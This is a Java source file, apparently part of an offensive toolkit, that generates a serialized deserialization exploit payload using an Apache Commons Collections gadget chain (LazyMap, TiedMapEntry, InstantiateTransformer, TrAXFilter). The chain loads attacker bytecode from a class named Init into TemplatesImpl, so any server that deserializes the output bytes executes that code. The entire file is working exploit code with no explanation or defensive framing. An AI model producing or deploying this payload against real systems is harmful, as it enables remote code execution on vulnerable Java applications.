    package ccdr4gon;

    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import net.bytebuddy.ByteBuddy;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;

    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;

    public class CommonsCollectionsK1_1 {

        public CommonsCollectionsK1_1(){

        }

        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }

        public byte[] getPayload() throws Exception {

            byte[] code= new ByteBuddy()
                    .redefine(Init.class)
                    .name("Init")
                    .make()
                    .getBytes();

            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj,"_bytecodes",new byte[][] {code});
            setFieldValue(obj,"_name","ccdr4gon");
            setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
            InstantiateTransformer i=new InstantiateTransformer
                    (
                    new Class[] { Templates.class },
                    new Object[] { obj }
                    );
            Map originalMap  = new HashMap();
            Map decoratedMap = LazyMap.decorate(originalMap , i);

            Map fakedecoratedMap=LazyMap.decorate(originalMap, new ConstantTransformer("1"));
            TiedMapEntry tme = new TiedMapEntry(fakedecoratedMap,TrAXFilter.class);
            Map enterpointMap = new HashMap();
            enterpointMap.put(tme, "valuevalue");
            decoratedMap.clear();
            setFieldValue(tme,"map",decoratedMap);
            //  序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(enterpointMap);
            return baos.toByteArray();
        }
    }
